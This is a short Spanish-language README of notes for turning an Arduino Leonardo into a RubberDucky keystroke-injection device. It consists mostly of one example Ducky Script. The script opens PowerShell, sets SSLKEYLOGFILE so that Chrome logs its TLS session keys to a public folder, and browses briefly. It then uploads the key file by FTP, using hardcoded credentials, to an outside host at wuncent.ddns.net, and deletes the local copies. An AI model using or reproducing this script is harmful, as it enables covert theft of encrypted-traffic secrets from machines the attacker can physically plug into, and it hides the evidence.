# RubberDuckyLeonardo
Apuntes para configurar un Arduino Leonardo como RubberDucky

## Enlaces 

https://tahmidrayat.is-a.dev/ducky/

## Ejemplo

```
GUI q
DELAY 1000
STRING power
ENTER
DELAY 8000
STRING dir
ENTER
STRING setx sslkeylogfile C:/Users/Public/nominas.txt
ENTER
DELAY 4000
STRING start chrome
ENTER
DELAY 4000
STRING www.google.com
ENTER
DELAY 4000
TAB
TAB
TAB
TAB
TAB
ENTER
DELAY 1000
ALT F4
DELAY 1000
STRING copy c:/Users/Public/nominas.txt c:/Users/Public/nominas2.txt
ENTER
DELAY 1000
STRING $ftp = "ftp://wuncent.ddns.net/" 
ENTER
STRING $user = "ciber" 
ENTER
STRING $pass = "anaconda"  
ENTER
STRING $webclient = New-Object System.Net.WebClient 
ENTER
STRING $webclient.Credentials = New-Object System.Net.NetworkCredential($user,$pass)  
ENTER
STRING $itemName = "nominas2.txt"
ENTER
STRING $itemFullName="C:/Users/Public/$itemName"
ENTER
STRING $uri = New-Object System.Uri($ftp+$itemName) 
ENTER
STRING $webclient.UploadFile($uri, $itemFullName)
ENTER
DELAY 3000
STRING del c:/Users/Public/nominas.*
ENTER
STRING exit
ENTER
DELAY 2000

``` 
